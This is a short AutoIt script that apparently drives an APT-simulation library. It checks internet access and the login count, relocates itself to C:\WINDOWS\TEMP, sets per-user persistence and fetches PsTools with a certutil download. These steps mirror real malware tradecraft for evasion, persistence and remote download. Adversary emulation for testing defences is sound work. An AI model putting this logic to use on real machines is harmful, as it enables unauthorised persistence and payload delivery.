#include <APT-SimulActor.au3>

init()

if InternetCheck() Then

   If numberOfLogins(whoami()) > 2 Then

	  if isRunningFromFolder("C:\WINDOWS\TEMP") Then

		 SetPersistent4CurrentUser()

		 CertUtilDownloader($PSTools_URL)

	  Else

		 MoveAndRunAgain("C:\WINDOWS\TEMP")

	  EndIf

   EndIf

EndIf